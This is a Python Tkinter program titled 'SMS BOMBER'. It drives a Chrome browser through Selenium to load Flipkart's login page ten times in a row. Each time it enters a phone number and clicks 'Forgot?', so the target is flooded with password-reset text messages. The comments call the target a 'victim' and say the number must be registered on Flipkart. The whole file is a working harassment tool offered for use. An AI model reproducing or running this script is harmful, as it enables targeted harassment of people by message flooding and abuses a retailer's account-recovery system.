#SMS FROM SMS BOMBER
 #victim phone number must be registered in flipkart website else 
#this sms bomber would not work properly.
#thankyou
#developer: vishal vikash { tkinter projects india }



from tkinter import*
from tkinter import messagebox
from selenium import webdriver
import time


root = Tk()
root.geometry("750x350")
root.configure(bg="black")
root.title("SMS BOMBER")
def smsbomb():
    e1 = entry.get()
    browser = webdriver.Chrome(executable_path="C:\\Program Files (x86)\\chromedriver.exe")
    frequency = 10
    for i in range(frequency):
        browser.get('https://www.flipkart.com/account/login?ret=/')

        # find the element where we have to
        # enter the number using the class name
        number = browser.find_element_by_xpath('//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')

        # automatically type the target number
        number.send_keys(e1)

        # find the element to send a forgot password
        # request using it's class name
        forgot = browser.find_element_by_link_text('Forgot?')

        # clicking on that element
        forgot.click()

        # set the interval to send each sms
        time.sleep(2)
    browser.quit()




def msg(*args):
    messagebox.showinfo('sms','SMS FROM SMS BOMBER \n-------------------------------------------------\n '
                            'victim phone number must be registered in flipkart website else this sms bomber would not work properly \n'
                              'thankyou\n developer:vishal vikash { tkinter projects india }')

sms = Label(root,text="SMS BOMBER",font="arial 55 bold",fg="green",bg="black")
sms.pack()
sms = Label(root,text="enter your phone number",font="arial 15 bold",fg="green",bg="black")
sms.place(x=50,y=110)
entry = Entry(root,font="arial 21 bold",relief=SUNKEN,bg='black',fg="green",insertbackground="green")
entry.bind('<Button-1>',msg)
entry.place(x=50,y=150,width=650)



btn = Button(root, text="SMS BOMBER",font="arial 21 bold",fg='green',bg='black',command=smsbomb)
btn.place(x=250,y=250)

root.mainloop()
